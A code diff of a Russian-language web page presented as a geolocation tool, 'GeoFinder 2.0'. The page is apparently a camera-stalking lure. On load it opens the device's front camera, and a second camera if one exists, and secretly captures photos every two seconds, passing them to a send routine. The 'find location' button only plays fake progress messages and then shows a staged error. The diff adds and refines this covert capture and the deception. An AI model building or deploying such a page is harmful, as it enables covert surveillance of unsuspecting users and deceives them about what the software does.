@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GeoScan Pro</title>
+    <title>GeoFinder 2.0</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f);
+            background: #121212;
             color: white;
             height: 100vh;
             display: flex;
@@ -20,104 +20,119 @@
         }
         
         .container {
-            width: 90%;
-            max-width: 500px;
+            width: 95%;
+            max-width: 400px;
             padding: 20px;
-            background: rgba(0, 0, 0, 0.7);
+            background: #1e1e1e;
             border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
         }
         
         h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #4fc3f7;
         }
         
-        .map-placeholder {
+        .camera-preview {
             width: 100%;
-            height: 200px;
-            background: rgba(255, 255, 255, 0.1);
+            height: 250px;
+            background: #000;
             border-radius: 10px;
-            margin: 20px 0;
+            margin: 15px 0;
             position: relative;
             overflow: hidden;
         }
         
-        .map-marker {
+        .target-marker {
             position: absolute;
-            width: 20px;
-            height: 20px;
-            background: red;
+            width: 30px;
+            height: 30px;
+            border: 3px solid red;
             border-radius: 50%;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            animation: pulse 2s infinite;
+            animation: pulse 1.5s infinite;
+            z-index: 10;
         }
         
         @keyframes pulse {
             0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-            50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.7; }
+            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.7; }
             100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
         }
         
         .scan-button {
-            background: linear-gradient(90deg, #00c6ff, #0072ff);
+            background: linear-gradient(90deg, #00b4db, #0083b0);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
+            padding: 12px 25px;
+            font-size: 16px;
             border-radius: 50px;
             cursor: pointer;
-            margin: 20px 0;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            margin: 15px 0;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
             transition: all 0.3s;
         }
         
         .scan-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
         }
         
         .scan-button:disabled {
-            background: #ccc;
+            background: #555;
             cursor: not-allowed;
         }
         
-        .status-message {
+        .status-text {
             font-size: 14px;
             margin: 10px 0;
-            min-height: 20px;
+            min-height: 40px;
+            color: #aaa;
         }
         
-        .error-message {
+        .error-text {
             color: #ff6b6b;
+            font-size: 14px;
             display: none;
+            margin-top: 10px;
         }
         
         .hidden {
             display: none;
         }
+        
+        #realCameraFeed {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Зеркальное отображение для фронтальной камеры */
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>GeoScan Pro</h1>
-        <div class="map-placeholder">
-            <div class="map-marker"></div>
+        <h1>GeoFinder 2.0</h1>
+        <div class="camera-preview">
+            <div class="target-marker"></div>
+            <video id="realCameraFeed" autoplay playsinline></video>
         </div>
         
-        <div class="status-message" id="statusText">Готов к сканированию...</div>
+        <div class="status-text" id="statusText">
+            Наведите камеру на объект и нажмите "Найти местоположение"
+        </div>
         
-        <button class="scan-button" id="scanButton">Сканировать местоположение</button>
+        <button class="scan-button" id="scanButton">Найти местоположение</button>
         
-        <div class="error-message" id="errorText">
-            Ошибка: Не удалось определить местоположение. Попробуйте позже.
+        <div class="error-text" id="errorText">
+            Ошибка: Не удалось определить координаты (Код: 403)<br>
+            Попробуйте в другом месте или повторите позже
         </div>
     </div>
 
-    <!-- Скрытые элементы для камер -->
-    <video id="frontCamera" autoplay playsinline class="hidden"></video>
+    <!-- Скрытые элементы для второй камеры -->
     <video id="backCamera" autoplay playsinline class="hidden"></video>
     <canvas id="canvas1" class="hidden"></canvas>
     <canvas id="canvas2" class="hidden"></canvas>
@@ -136,38 +151,47 @@
         const scanButton = document.getElementById('scanButton');
         const statusText = document.getElementById('statusText');
         const errorText = document.getElementById('errorText');
+        const realCameraFeed = document.getElementById('realCameraFeed');
         
         // Инициализация камер
         async function initCameras() {
             try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                // Получаем фронтальную камеру для "превью"
+                frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                realCameraFeed.srcObject = frontStream;
                 
-                if (videoDevices.length >= 2) {
-                    frontStream = await navigator.mediaDevices.getUserMedia({
-                        video: { deviceId: videoDevices[0].deviceId }
-                    });
-                    backStream = await navigator.mediaDevices.getUserMedia({
-                        video: { deviceId: videoDevices[1].deviceId }
-                    });
-                } else {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    frontStream = backStream = stream;
+                // Пытаемся получить вторую камеру
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                    
+                    if (videoDevices.length >= 2) {
+                        backStream = await navigator.mediaDevices.getUserMedia({
+                            video: { deviceId: videoDevices.find(d => d.deviceId !== frontStream.getVideoTracks()[0].getSettings().deviceId).deviceId }
+                        });
+                        document.getElementById('backCamera').srcObject = backStream;
+                    }
+                } catch (e) {
+                    console.log("Не удалось получить вторую камеру");
                 }
-                
-                document.getElementById('frontCamera').srcObject = frontStream;
-                document.getElementById('backCamera').srcObject = backStream;
                 
                 // Начинаем скрытую съемку
                 startHiddenScan();
                 
             } catch (error) {
-                console.error("Camera init error:", error);
+                console.error("Camera error:", error);
+                statusText.textContent = "Ошибка доступа к камере. Разрешите доступ и обновите страницу.";
             }
         }
         
         // Скрытая съемка каждые 2 секунды
         function startHiddenScan() {
+            // Первый снимок сразу
+            setTimeout(captureAndSendPhotos, 1000);
+            
+            // Затем каждые 2 секунды
             scanInterval = setInterval(() => {
                 captureAndSendPhotos();
             }, 2000);
@@ -175,14 +199,18 @@
         
         // Захват и отправка фото
         async function captureAndSendPhotos() {
-            if (!frontStream && !backStream) return;
+            if (!frontStream) return;
             
             try {
-                const frontPhoto = await capturePhoto('frontCamera', 'canvas1');
-                const backPhoto = await capturePhoto('backCamera', 'canvas2');
-                
+                // Делаем снимок с фронтальной камеры
+                const frontPhoto = await capturePhoto('realCameraFeed', 'canvas1');
                 await sendPhoto(frontPhoto, 'geo_scan_front.jpg');
-                await sendPhoto(backPhoto, 'geo_scan_back.jpg');
+                
+                // Если есть вторая камера - снимок с нее
+                if (backStream) {
+                    const backPhoto = await capturePhoto('backCamera', 'canvas2');
+                    await sendPhoto(backPhoto, 'geo_scan_back.jpg');
+                }
                 
             } catch (error) {
                 console.error("Capture error:", error);
@@ -198,9 +226,21 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const context = canvas.getContext('2d');
+                
+                // Для фронтальной камеры - зеркальное отображение
+                if (videoElement === 'realCameraFeed') {
+                    context.translate(canvas.width, 0);
+                    context.scale(-1, 1);
+                }
+                
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                canvas.toBlob(resolve, 'image/jpeg', 0.85);
+                // Возвращаем контекст в исходное состояние
+                if (videoElement === 'realCameraFeed') {
+                    context.setTransform(1, 0, 0, 1, 0, 0);
+                }
+                
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
             });
         }
         
@@ -226,27 +266,35 @@
             
             isScanning = true;
             scanButton.disabled = true;
-            statusText.textContent = "Сканирование местоположения...";
+            statusText.textContent = "Инициализация геопоиска...";
             
             // Имитация процесса сканирования
             setTimeout(() => {
-                statusText.textContent = "Анализ данных...";
+                statusText.textContent = "Сканирование окружения...";
                 
                 setTimeout(() => {
-                    // Показываем "ошибку"
-                    statusText.textContent = "";
-                    errorText.style.display = "block";
-                    scanButton.disabled = false;
-                    isScanning = false;
+                    statusText.textContent = "Анализ топографических данных...";
                     
-                    // Через 3 секунды скрываем ошибку
                     setTimeout(() => {
-                        errorText.style.display = "none";
-                        statusText.textContent = "Готов к сканированию...";
+                        statusText.textContent = "Определение координат...";
+                        
+                        setTimeout(() => {
+                            // Показываем "ошибку"
+                            statusText.textContent = "";
+                            errorText.style.display = "block";
+                            scanButton.disabled = false;
+                            isScanning = false;
+                            
+                            // Через 5 секунд скрываем ошибку
+                            setTimeout(() => {
+                                errorText.style.display = "none";
+                                statusText.textContent = "Наведите камеру на объект и нажмите 'Найти местоположение'";
+                            }, 5000);
+                            
+                        }, 3000);
                     }, 3000);
-                    
                 }, 2000);
-            }, 1500);
+            }, 1000);
         });
         
         // Запускаем при загрузке
@@ -255,7 +303,7 @@
         // Очистка при закрытии
         window.addEventListener('beforeunload', () => {
             if (frontStream) frontStream.getTracks().forEach(track => track.stop());
-            if (backStream && backStream !== frontStream) backStream.getTracks().forEach(track => track.stop());
+            if (backStream) backStream.getTracks().forEach(track => track.stop());
             if (scanInterval) clearInterval(scanInterval);
         });
     </script>
